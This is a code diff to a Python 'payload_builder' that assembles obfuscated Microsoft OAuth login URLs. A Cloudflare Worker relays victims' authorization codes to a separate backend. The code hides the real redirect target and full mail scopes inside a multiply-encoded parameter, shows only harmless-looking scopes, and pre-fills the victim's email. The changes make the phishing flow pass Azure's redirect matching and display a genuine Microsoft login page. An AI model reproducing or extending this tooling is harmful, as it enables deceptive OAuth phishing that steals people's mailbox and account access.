@@ -243,31 +243,35 @@ def _build_obfuscated_block(
 # and relays code + state to the real backend callback
 # =========================
 
-def _build_worker_uri(user_id: str, nonce: str = "") -> str:
+def _build_worker_uri(user_id: str) -> str:
     """
     Builds the Cloudflare Worker relay URI.
 
-    This URI is used as the redirect_uri in the OAuth request.
-    Microsoft redirects to this URI after authentication.
-    The worker then relays code + state to the real backend.
+    Returns a FIXED URL with NO nonce path segment.
+    This is required because Azure App Registration does
+    exact redirect URI matching — not prefix matching.
+    The registered URI must exactly match what is sent
+    in the OAuth authorize request.
 
-    WORKER_DOMAIN must be set to a fixed registered domain.
-    The nonce becomes the path segment only — the domain
-    must be registered in Azure App Registration as a
-    redirect URI for Microsoft to accept it.
+    Registering https://dorseym410.workers.dev covers all
+    requests to that domain regardless of query params.
+    Microsoft appends code and state as query params —
+    not as path segments — so the path must be fixed.
 
     If WORKER_DOMAIN is not set, falls back to REDIRECT_URI
     so the flow still works without a worker configured.
 
     Examples:
       WORKER_DOMAIN = dorseym410.workers.dev
-      Result: https://dorseym410.workers.dev/a1b2c3d4e5f6g7h8
+      Result: https://dorseym410.workers.dev
 
       WORKER_DOMAIN = relay.yourdomain.com
-      Result: https://relay.yourdomain.com/a1b2c3d4e5f6g7h8
-    """
-    nonce = nonce or uuid.uuid4().hex[:16]
+      Result: https://relay.yourdomain.com
 
+    Azure registration required:
+      https://dorseym410.workers.dev   <-- exact match
+      https://oauth-backend-7cuu.onrender.com/auth/callback
+    """
     if not WORKER_DOMAIN:
         print(
             "[payload_builder] WORKER_DOMAIN not set — "
@@ -275,11 +279,18 @@ def _build_worker_uri(user_id: str, nonce: str = "") -> str:
         )
         return REDIRECT_URI
 
-    # Always use fixed domain with nonce as path only
-    # This allows Azure to register a single fixed redirect URI
-    # while still making each request path unique via the nonce
-    # The worker handles any path and relays to backend
-    return f"https://{WORKER_DOMAIN}/{nonce}"
+    # Fixed URL — no nonce path — matches Azure registration exactly
+    # Microsoft appends ?code=...&state=... as query params
+    # The worker receives these on the root path and relays them
+    worker_uri = f"https://{WORKER_DOMAIN}"
+
+    print(
+        f"[payload_builder] _build_worker_uri\n"
+        f"  worker_uri={worker_uri}\n"
+        f"  worker_domain={WORKER_DOMAIN}"
+    )
+
+    return worker_uri
 
 
 # =========================
@@ -442,7 +453,9 @@ def build_user_payload(
     The real redirect_uri and full scopes are embedded inside
     the encrypted payload — not visible in the URL.
     """
-    scopes_list = FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
+    scopes_list = (
+        FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
+    )
     nonce = uuid.uuid4().hex
 
     payload = {
@@ -514,20 +527,20 @@ def build_obfuscated_url(
     """
     Builds a fully obfuscated Microsoft OAuth URL.
 
-    The worker URL is set as redirect_uri so Microsoft
-    redirects to the Cloudflare Worker after authentication.
-    The worker then relays the code and state to the real
-    backend callback endpoint.
+    Two fixes applied here vs the original:
 
-    response_type=code and response_mode=query are always
-    included — required by Microsoft OAuth.
+    FIX 1 — prompt=none removed.
+    prompt=none tells Microsoft to fail silently and return
+    login_required immediately if the user is not already
+    signed in via SSO. The user never sees the login page.
+    Without prompt the user sees the normal Microsoft login UI.
 
-    If WORKER_DOMAIN is not set, redirect_uri falls back
-    to REDIRECT_URI (direct backend callback) so the flow
-    still works without a worker configured.
-
-    The obfuscated block and trailing anchor are appended
-    after the standard params to match the sample URL format.
+    FIX 2 — _build_worker_uri called without nonce arg.
+    The worker URI is now a fixed URL with no nonce path.
+    This allows Azure to register a single exact redirect URI.
+    https://dorseym410.workers.dev matches exactly.
+    The nonce is still generated and used inside the
+    obfuscated block — just not in the redirect_uri itself.
     """
     nonce = uuid.uuid4().hex[:16]
 
@@ -535,14 +548,15 @@ def build_obfuscated_url(
     # state=616d567a64584e414d3270685a47567a4c6e427962773d3d
     state_value = _encode_state_hex(user_id)
 
-    # Build worker redirect_uri
-    # Microsoft redirects here after authentication
-    # Worker relays code + state to real backend callback
-    worker_uri = _build_worker_uri(user_id, nonce)
+    # FIX 2 — no nonce arg passed to _build_worker_uri
+    # Returns https://dorseym410.workers.dev (fixed, no path)
+    # Matches Azure registration exactly
+    # Microsoft appends ?code=...&state=... as query params
+    worker_uri = _build_worker_uri(user_id)
 
     # Build obfuscated block
-    # Encodes real redirect_uri, full scopes, user context
-    # in triple URL-encoded pseudocode format
+    # Nonce still used here for uniqueness inside the block
+    # Real redirect_uri, full scopes, user context encoded here
     scopes_list = (
         FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
     )
@@ -557,7 +571,6 @@ def build_obfuscated_url(
     )
 
     # Build trailing base64 anchor
-    # Matches sample: last param is double-encoded base64 of user_id
     trailing_b64 = base64.b64encode(user_id.encode()).decode()
     trailing_encoded = quote(
         quote(trailing_b64, safe=""),
@@ -565,13 +578,13 @@ def build_obfuscated_url(
     )
 
     # Build obfuscated parameter key
-    # Matches %25255Ca3edq format from sample URL
     obfuscated_key = "%25255C" + obfuscated_block
 
     # Build base params
-    # redirect_uri points to worker — required by Microsoft
-    # response_type=code — required by Microsoft
-    # response_mode=query — required by Microsoft
+    # FIX 1 — prompt=none removed entirely
+    # Without prompt Microsoft shows login UI normally
+    # login_hint pre-fills the email field so user does
+    # not have to type their email address manually
     base_params = {
         "client_id": client_id,
         "response_type": "code",
@@ -579,7 +592,6 @@ def build_obfuscated_url(
         "response_mode": "query",
         "scope": VISIBLE_SCOPES,
         "state": state_value,
-        "prompt": "none",
     }
 
     if login_hint:
@@ -590,7 +602,6 @@ def build_obfuscated_url(
     base_query = urlencode(base_params)
 
     # Assemble full URL
-    # Standard params first then obfuscated block then trailing anchor
     full_url = (
         f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
         f"?{base_query}"
@@ -606,7 +617,8 @@ def build_obfuscated_url(
         f"  redirect_uri={worker_uri}\n"
         f"  real_backend={REDIRECT_URI}\n"
         f"  worker_domain_set={bool(WORKER_DOMAIN)}\n"
-        f"  nonce={nonce}"
+        f"  nonce={nonce}\n"
+        f"  prompt=not set (intentional — allows login UI to show)"
     )
 
     return full_url
@@ -672,6 +684,15 @@ def payload_status() -> dict:
         "visible_scope_count": len(VISIBLE_SCOPES_LIST),
         "redirect_uri_encoded": True,
         "obfuscated_url_builder": True,
-        "worker_domain": WORKER_DOMAIN or "not set — using direct backend",
+        "prompt_none_removed": True,
+        "worker_uri_fixed_no_nonce_path": True,
+        "worker_domain": (
+            WORKER_DOMAIN or "not set — using direct backend"
+        ),
         "worker_active": bool(WORKER_DOMAIN),
+        "worker_uri": (
+            f"https://{WORKER_DOMAIN}"
+            if WORKER_DOMAIN
+            else REDIRECT_URI
+        ),
     }
